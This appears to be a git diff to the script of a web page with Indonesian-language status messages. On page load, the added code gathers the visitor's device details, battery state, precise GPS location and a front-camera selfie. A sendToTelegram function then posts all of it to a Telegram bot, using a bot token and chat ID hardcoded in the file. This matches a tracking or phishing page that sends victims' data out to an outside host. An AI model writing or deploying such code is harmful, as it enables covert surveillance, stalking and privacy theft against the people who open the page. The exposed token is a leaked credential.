@@ -10,8 +10,48 @@ window.addEventListener('DOMContentLoaded', async () => {
     statusList.appendChild(li);
   };
 
+  const getDeviceInfo = async () => {
+    updateStatus('📱 Mengambil info perangkat...');
+    const info = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screenWidth: window.screen.width,
+      screenHeight: window.screen.height
+    };
+
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        info.battery = {
+          level: Math.round(battery.level * 100) + '%',
+          isCharging: battery.charging
+        };
+      } catch {
+        info.battery = { level: 'N/A', isCharging: 'N/A' };
+      }
+    }
+
+    return info;
+  };
+
+  const getLocation = () => {
+    updateStatus('📍 Mengambil lokasi...');
+    return new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        }),
+        err => reject(new Error('Gagal ambil lokasi: ' + err.message)),
+        { enableHighAccuracy: true, timeout: 15000 }
+      );
+    });
+  };
+
   const getPhoto = async () => {
-    updateStatus('📷 Meminta izin kamera...');
+    updateStatus('📸 Mengaktifkan kamera...');
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
     videoEl.srcObject = stream;
     await new Promise(res => videoEl.onloadedmetadata = res);
@@ -26,26 +66,57 @@ window.addEventListener('DOMContentLoaded', async () => {
     return base64;
   };
 
-  const getLocation = () => {
-    updateStatus('📍 Meminta izin lokasi...');
-    return new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve({
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude
-        }),
-        err => reject(new Error('Gagal mengambil lokasi: ' + err.message)),
-        { enableHighAccuracy: true, timeout: 15000 }
-      );
+  const sendToTelegram = async (data) => {
+    const botToken = '6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc';
+    const chatId = '1265481161';
+
+    const message = `
+📱 *Perangkat*
+• UA: ${data.deviceInfo.userAgent}
+• Platform: ${data.deviceInfo.platform}
+• Resolusi: ${data.deviceInfo.screenWidth}x${data.deviceInfo.screenHeight}
+• Baterai: ${data.deviceInfo.battery.level}, Charging: ${data.deviceInfo.battery.isCharging}
+
+📍 *Lokasi*
+• Latitude: ${data.location.lat}
+• Longitude: ${data.location.lon}
+• Akurasi: ${data.location.accuracy} m
+`.trim();
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    const blob = await (await fetch(data.photoBase64)).blob();
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', blob, 'selfie.jpg');
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: 'POST',
+      body: formData
     });
   };
 
   try {
-    const photo = await getPhoto();
-    updateStatus('✅ Foto berhasil diambil');
+    const data = {};
+    data.deviceInfo = await getDeviceInfo();
+    updateStatus('✅ Info perangkat OK');
 
-    const loc = await getLocation();
-    updateStatus(`✅ Lokasi: ${loc.lat.toFixed(4)}, ${loc.lon.toFixed(4)}`);
+    data.location = await getLocation();
+    updateStatus('✅ Lokasi OK');
+
+    data.photoBase64 = await getPhoto();
+    updateStatus('✅ Foto OK');
+
+    await sendToTelegram(data);
+    updateStatus('✅ Data berhasil dikirim ke Telegram!');
   } catch (err) {
     updateStatus(`❌ ${err.message}`, true);
   }
